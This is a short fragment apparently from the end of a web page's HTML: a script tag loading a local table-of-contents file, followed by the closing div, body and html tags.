<script src="/js/toc.js"></script>

        
    
</div>



</body>
</html>
